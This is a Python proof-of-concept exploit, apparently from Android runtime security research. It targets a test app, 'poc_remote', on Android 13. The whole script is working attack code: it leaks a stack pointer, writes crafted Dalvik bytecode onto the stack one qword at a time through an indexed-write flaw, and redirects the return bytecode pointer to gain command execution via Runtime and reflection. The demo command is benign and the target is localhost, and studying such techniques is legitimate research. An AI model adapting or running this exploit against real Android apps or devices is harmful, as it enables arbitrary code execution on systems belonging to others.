#!/usr/bin/env python3

import traceback
from typing import Tuple
from pwn import *
context.log_level = 'error'
from ropper import RopperService

import json
from pathlib import Path

import math

from typing import Dict
from typing import List

from client import PwnClient
from bcbuilder import BytecodeBuilder
from generic_shellcode import GenericCommandExecutionShellcode

def wait_for_debugger() -> None:
    input('<enter>')


def write_qword(client: PwnClient, index: int, value: int) -> None:
    assert (value & (2**64 - 1)) == value, f'{hex(value)} does not fit into qword.'
    assert (index & (2**32 - 1)) == index, f'{hex(index)} does not fit into dword.'
    assert (index >= 0), f'{index} must be non - negative.'
    client.send_int(1)  # stay in receive loop
    client.send_int(index)  # choose index
    client.send_long(value) # choose qword to write to stack


def write_bytes(client: PwnClient, base_index: int, buffer: bytes) -> None:
    assert (buffer)
    buffer += b'\x00' * (8 - (len(buffer) % 8))
    for i in range(len(buffer) // 8):
        write_qword(client, base_index + i, u64(buffer[8 * i: 8 * (i + 1)]))


def inject_shellcode(client: PwnClient, base_index: int, shellcode: bytes) -> None:
    write_bytes(client, base_index, shellcode)


class GenericCommandExecutionExploit:
    def __init__(self,
            off_dex_pc_ptr: int,
            off_shellcode: int,
            char_array_index: int,
            stringbuilder_index: int,
            stringbuilder_constructor_index: int,
            stringbuilder_append_chararray_index: int,
            runtime_getruntime_index: int,
            stringbuilder_tostring_index: int,
            object_getclass_index: int,
            classarray_index: int,
            string_index: int,
            class_getdeclaredmethod_index: int,
            objectarray_index: int,
            method_invoke_index: int,
            object_index: int,
            leak_to_buffer_offset: int) -> None:
        """Generalization of exploit for testing on multiple devices.

        All method and type indices are wrt. the `classes.dex` file of the
        target `.apk`, i.e. `poc_remote.apk`. This is because the method
        targeted is defined in `poc_remote`, which means the associated
        `DexCache` is linked to one of the `.dex` files in the `poc_remote.apk`
        file that contains the targeted method. As there only exists a
        single `.dex` file, namely `classes.dex`, this is trivial.

        For this class and subclasses, the `.dex` file associated with
        the method, whose return bytecode program counter is overwritten
        in this exploit, is called the *context*.

        Parameters
        ----------
        off_dex_pc_ptr : int
            Offset of the bytecode program counter to overwrite on the stack
            relative to the buffer base. The program counter to overwrite
            should be the immediate caller of `writeIndexed`.
        off_shellcode : int
            Offset of the shellcode relative to the buffer base. This is used
            to move shellcode far up the stack to avoid overwriting data
            accessed by current or immediate parent methods.
        char_array_index : int
            Index of the `'char[]'` type within current context.
        stringbuilder_index : int
            Index of the `'StringBuilder'` type within current context.
        stringbuilder_constructor_index : int
            Index of the `'StringBuilder(void)'` constructor method
            within current context.
        stringbuilder_append_chararray_index : int
            Index of the `'StringBuilder::append(char[])'` method within
            current context.
        runtime_getruntime_index : int
            Index of the `'Runtime::getRuntime(void)'` method within
            current context.
        stringbuilder_tostring_index : int
            Index of the `'StringBuilder::toString(void)'` method within
            current context.
        object_getclass_index : int
            Index of the `'Object::getClass(void)'` method within current
            context.
        classarray_index : int
            Index of the `'Class[]'` type within current context.
        string_index : int
            Index of the `'String'` type within current context.
        class_getdeclaredmethod_index : int
            Index of the `'Class::getDeclaredMethod(String, Class[])'` method
            within current context.
        objectarray : int
            Index of the `'Object[]'` type within current context.
        method_invoke_index : int
            Index of the `'Method::invoke(Object, Object[])'` method within
            current context.
        object_index : int
            Index of the `'Object'` type within current context.
        leak_to_buffer_offset : int
            Offset of the address leaked relative to the address of the buffer
            used inside the `writeIndexed` method. Usually `0`, but depends on
            how the native code is compiled.
        """
        self.__off_dex_pc_ptr = off_dex_pc_ptr
        self.__off_shellcode = off_shellcode
        self.__char_array_index = char_array_index
        self.__stringbuilder_index = stringbuilder_index
        self.__stringbuilder_constructor_index = stringbuilder_constructor_index
        self.__stringbuilder_append_chararray_index = stringbuilder_append_chararray_index
        self.__runtime_getruntime_index = runtime_getruntime_index
        self.__stringbuilder_tostring_index = stringbuilder_tostring_index
        self.__object_getclass_index = object_getclass_index
        self.__classarray_index = classarray_index
        self.__string_index = string_index
        self.__class_getdeclaredmethod_index = class_getdeclaredmethod_index
        self.__objectarray_index = objectarray_index
        self.__method_invoke_index = method_invoke_index
        self.__object_index = object_index
        self.__leak_to_buffer_offset = leak_to_buffer_offset

    def run(self) -> None:
        """Runs this exploit.
        """
        self.__command_execution(
            self.__off_dex_pc_ptr,
            self.__off_shellcode,
            self.__char_array_index,
            self.__stringbuilder_index,
            self.__stringbuilder_constructor_index,
            self.__stringbuilder_append_chararray_index,
            self.__runtime_getruntime_index,
            self.__stringbuilder_tostring_index,
            self.__object_getclass_index,
            self.__classarray_index,
            self.__string_index,
            self.__class_getdeclaredmethod_index,
            self.__objectarray_index,
            self.__method_invoke_index,
            self.__object_index,
            self.__leak_to_buffer_offset
        )

    def __command_execution(self,
            off_dex_pc_ptr: int,
            off_shellcode: int,
            char_array_index: int,
            stringbuilder_index: int,
            stringbuilder_constructor_index: int,
            stringbuilder_append_chararray_index: int,
            runtime_getruntime_index: int,
            stringbuilder_tostring_index: int,
            object_getclass_index: int,
            classarray_index: int,
            string_index: int,
            class_getdeclaredmethod_index: int,
            objectarray_index: int,
            method_invoke_index: int,
            object_index: int,
            leak_to_buffer_offset: int=0x0) -> None:
        """Obtains command execution in `poc_remote` using bytecode injection.
        """
        
        client = PwnClient('127.0.0.1', 8080)

        wait_for_debugger()

        # Pointer leak
        leak: int = client.receive_long()
        print(f'Leak: {hex(leak)}')

        wait_for_debugger()

        # Build shellcode that triggers command execution
        shellcode: bytes = GenericCommandExecutionShellcode.build_shellcode_stable(
            b'log "HELLO"',
            char_array_index,
            stringbuilder_index,
            stringbuilder_constructor_index,
            stringbuilder_append_chararray_index,
            runtime_getruntime_index,
            stringbuilder_tostring_index,
            object_getclass_index,
            classarray_index,
            string_index,
            class_getdeclaredmethod_index,
            objectarray_index,
            method_invoke_index,
            object_index,
            available_vregs=4,
        )

        # Account for nterp adjust return address by 6 (size of invoke virtual)
        shellcode = b'\x00' * 6 + shellcode

        print(shellcode)
        idx_shellcode: int = off_shellcode // 8
        inject_shellcode(client, idx_shellcode, shellcode)

        # Patch dex_pc_ptr
        addr_buffer = leak + leak_to_buffer_offset
        assert (off_dex_pc_ptr % 8 == 0), f'{hex(off_dex_pc_ptr)} must be multiple of 8.'
        idx_dex_pc_ptr: int = off_dex_pc_ptr // 8
        print(f'Patching dex pc ptr index {hex(idx_dex_pc_ptr)} with {hex(addr_buffer + idx_shellcode * 8)}')
        write_qword(client, idx_dex_pc_ptr, addr_buffer + idx_shellcode * 8)

        wait_for_debugger()

        client.close()


class Android13CommandExecutionExploit(GenericCommandExecutionExploit):
    def __init__(self) -> None:
        super().__init__(
            off_dex_pc_ptr=0x88,
            off_shellcode=0x1000,
            char_array_index=0x1d25,
            stringbuilder_index=0x150f,
            stringbuilder_constructor_index=0xa741,
            stringbuilder_append_chararray_index=0xa750,
            runtime_getruntime_index=0xa6ee,
            stringbuilder_tostring_index=0xa75d,
            object_getclass_index=0xa6e2,
            classarray_index=0x1dd7,
            string_index=0x150d,
            class_getdeclaredmethod_index=0xa614,
            objectarray_index=0x1dde,
            method_invoke_index=0xa7b5,
            object_index=0x1502,
            leak_to_buffer_offset=0x0)


version_to_command_exploit = {
    # Format: Android version (int) -> GenericAndroidExploit
    13: Android13CommandExecutionExploit(),
}


def main():
    exploit = version_to_command_exploit[13]
    exploit.run()


if (__name__ == '__main__'):
    main()